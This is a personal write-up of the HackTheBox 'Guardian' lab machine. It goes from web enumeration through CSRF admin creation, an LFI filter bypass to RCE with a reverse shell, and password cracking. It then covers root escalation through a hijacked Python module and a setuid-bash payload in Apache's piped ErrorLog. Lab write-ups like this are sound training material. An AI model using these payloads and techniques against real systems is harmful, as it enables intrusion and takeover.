# Guardian — HackTheBox

**Category:** Web / Linux  
**Difficulty:** Hard  

---

## nmap

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

its a php site
in the http page there is a contact page but its just html

---

## enumeration

enumerating subdomains we found:

```
portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 248ms]
```

in the login guide it says Your default password is: `GU1234`

in the student testimonial found usernames:

```
GU0142023  GU6262023  GU0702025
```

tried to login with default pass worked

bruteforcing dir in portal.guardian.htb:

```
/admin                (Status: 301) [Size: 326] [--> http://portal.guardian.htb/admin/]
/static               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/static/]
/includes             (Status: 301) [Size: 329] [--> http://portal.guardian.htb/includes/]
/javascript           (Status: 301) [Size: 331] [--> http://portal.guardian.htb/javascript/]
/student              (Status: 301) [Size: 328] [--> http://portal.guardian.htb/student/]
/vendor               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/vendor/]
/config               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/config/]
/models               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/models/]
```

in `http://portal.guardian.htb/student/course.php?id=18` we cannot view any course by IDOR cuz it says `Access denied. You are not enrolled in this course.`

in `http://portal.guardian.htb/student/submission.php?assignment_id=15` where we have file upload
uploading a php file shows `Invalid file type. Only .docx and .xlsx files are allowed.` but i dont see a place to see uploaded files

in `http://portal.guardian.htb/student/chats.php` we can see every users
`http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14` seems vulnerable maybe we can see anyones chat

`/student/notices.php?search=&author=1&sort=created_by` might be vulnerable

bruteforcing chats we found in `/student/chat.php?chat_users[0]=1&chat_users[1]=2` admin shared pass for gitea to jamil.enockson:

```
DHsNnk3V503
```

gitea is an open-source easy to self-host alternative to github
which also means admin's user id = 1

bruteforcing dir in portal.guardian.htb again using common.txt wordlist:

```
/.git                 (Status: 403) [Size: 284]
/.git/HEAD            (Status: 403) [Size: 284]
/.git-rewrite         (Status: 403) [Size: 284]
/.env                 (Status: 403) [Size: 284]
/.gitmodules          (Status: 403) [Size: 284]
/.gitkeep             (Status: 403) [Size: 284]
/.git_release         (Status: 403) [Size: 284]
/.gitignore           (Status: 403) [Size: 284]
/.gitk                (Status: 403) [Size: 284]
/.gitattributes       (Status: 403) [Size: 284]
/.git/logs/           (Status: 403) [Size: 284]
/.gitconfig           (Status: 403) [Size: 284]
/.git/index           (Status: 403) [Size: 284]
/.git/config          (Status: 403) [Size: 284]
/.gitreview           (Status: 403) [Size: 284]
/.htaccess            (Status: 403) [Size: 284]
/.hta                 (Status: 403) [Size: 284]
/.htpasswd            (Status: 403) [Size: 284]
/admin                (Status: 301) [Size: 326] [--> http://portal.guardian.htb/admin/]
/cgi-bin/             (Status: 403) [Size: 284]
/config               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/config/]
/includes             (Status: 301) [Size: 329] [--> http://portal.guardian.htb/includes/]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/javascript           (Status: 301) [Size: 331] [--> http://portal.guardian.htb/javascript/]
/models               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/models/]
/server-status        (Status: 403) [Size: 284]
/static               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/static/]
/student              (Status: 301) [Size: 328] [--> http://portal.guardian.htb/student/]
/vendor               (Status: 301) [Size: 327] [--> http://portal.guardian.htb/vendor/]
```

there is a git and also cgi-bin!

bruteforcing /config i found:

```
/db.php               (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
```

but they are just black page

trying to log in as jamil.enockson wit the pass shows:

```
Database connection failed
SQLSTATE[HY000] [1049] Unknown database 'guardiandb'
```

but turns out it was just a onetime thing

after a quick search i saw to access gitea of a webpage there is a gitea subdomain and there was!!
`gitea.guardian.htb`

so i logged in with username: `jamil` pass: `DHsNnk3V503` and found the websites source code
cloned the source code to my machine for easier navigation

in config.php found creds:

```
root : Gu4rd14n_un1_1s_th3_b3st
```

also the cgi-bin and .git stuff was bs it appeared in bruteforce cuz of .htaccess prob

through the source code i found files are uploaded to `/attachment_uploads/filename` with new generate file name

---

## foothold

if we get LFI we can read session files or we its a file upload vuln we can exploit if we become a lecturer

in `lecturer/view-submission.php` I (deepseek) saw:

```php
$file_path = '../attachment_uploads/' . $submission['attachment_name'];
```

its stored in attachment_uploads as a new name
and files are processed with:

```php
$phpWord = \PhpOffice\PhpWord\IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
```

the site uses phpword version 1.3.0 vulnerable to CVE-2025-48882 which is a XXE / File read / SSRF vuln
maybe if we can make SSRF req then we can make a ssrf request to ourself and fetch a malicious php serialized code which would be saved to where our session cookie would be saved on the server and when deserialized it executes reverse shell?

i thought if we just were lecturer we can execute our code so i checked all php codes in /lecturer and greped isAuthenticated to see if it requires to be authenticated and in `/grade-submission.php` there was no isAuthenticated

sending a post request to this with param:

```json
{"submission_id": 1, "mark_given": 85}
```

shows `{"success":true}`

but something like:

```json
{"submission_id": 1;id;, "mark_given": 85}
```

shows `{"success":false,"error":"Invalid grade"}`

but we can still grade anyones assignment which means if it was in my school i would always top

also in `admin/reports` there are `academic.php` `enrollment.php` `financial.php` `system.php` and none have authentication checks neither in `admin/notices/delete.php` but its empty
but in anything nothing useful is there

tokens are stored in `config/tokens.json` and are not tied to user sessions and are generated when any user visits `/admin/createuser.php` or `/lecturer/notices/create.php`. first token is generated then only users role is checked

```bash
curl -s "http://portal.guardian.htb/config/tokens.json"
```

showed tokens after visiting the endpoints
but the flow for post request to admin/createuser.php is like this:

```
Request comes in (GET or POST)
Generate token, add to pool
Check authentication & role ← THIS BLOCKS YOU!
If POST, check CSRF token
Process POST data
```

just found out `uniqid()` is not random but is based on microtime(). examples of possible time:

```
if entropy true: attachment_(hex-encoded ms).(random_no.)
if entropy false: attachment_(hex-encoded ms)
```

tried bruteforcing but didnt work

so i looked at the writeup and found out we had to exploit a vuln in phpspreadsheet 3.7.0 for which i searched for a vuln but nothing appeared and said it was not vulnerable but when he did it showed a vuln maybe because he searched for ver 3.8.0 even though it uses 3.7.0 idk how but for him google showed it is vulnerable but not to me. OK.

exploiting it using a public POC exploit we got the cookie:

```
PHPSESSID=itlngrlu17ms4ja6esl1fl138o
```

now gotta exploit phpword 1.3.0 vuln for file read
the file uploaded isnt showing lol

in create new notice there was an option to send reference link which the admin would view so we created a page which would make the admin make post request to create new admin user with the csrf token we get from `config/tokens.json` and it worked!!

```
created new user lecturerhack:hack123
```

found LFI in `http://portal.guardian.htb/admin/reports.php?report=../../../../../etc/passwd` but it blocked it cuz of malicious req
the code for checking it has 2 checks:

```php
if (strpos($report, '..') !== false) // Blocks .. (path traversal)
if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) // Only allows files ending with those 4 names
```

using `php_filter_generator.py` tool and adding `,system.php` at last we bypassed it and even got RCE so we curled reverse shell and executed it and got shell

and we also have db creds from earlier and the passwords are hashed using the salt which we had found earlier

tried to crack admin, sammy, jamil and mark's password as they were the users in the machine

and got:

```
admin : fakebake000
jamil : copperhouse56
```

ssh'ed in with jamil's creds

---

## privilege escalation

saw jamil was part of admins group which had special perms on:

```
/opt/scripts/utilities
/opt/scripts/utilities/output
/opt/scripts/utilities/utils/attachments.py
/opt/scripts/utilities/utils/db.py
/opt/scripts/utilities/utils/status.py
/opt/scripts/utilities/utils/logs.py
/opt/scripts/utilities/utilities.py
```

and `sudo -l` showed:

```
(mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

in utilities.py we had perms to execute as mark and using utilities.py we could execute the scripts in utils/ and our group admins had write perms to utils/status.py so we wrote to utils/status.py:

```python
cat > /tmp/status_hijack.py << 'EOF'
import os
import pty

def system_status():
    # This will be called when running: sudo -u mark utilities.py system-status
    os.setuid(1001)  # mark's UID - check with: id -u mark
    pty.spawn("/bin/bash")
EOF
```

and executed using:

```bash
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

to become mark. doing `sudo -l` again we saw:

```
(ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

its a custom apache wrapper using which we can start a server with our own conf but there is also a cronjob running deleting our every conf files every minute in `/home/mark/confs/*`. also there are custom security checks:

```
The config must be inside /home/mark/confs
It ultimately executes /usr/sbin/apache2ctl
Uses realpath() to check the actual path not symlinks
```

tried many things that deepseek gave but didnt work so i looked at the writeup and saw he said that he searched through apache documentation and known privilege escalation techniques to know that:
in errorlog we can pipe shell commands

so the malicious conf file content which worked at last was:

```apache
cat > /home/mark/confs/simple_mpm.conf << 'EOF'
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
ServerName localhost
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'"
EOF
```

and we got ROOT!!

---

## proof

![root](../../proof/guardian.png)
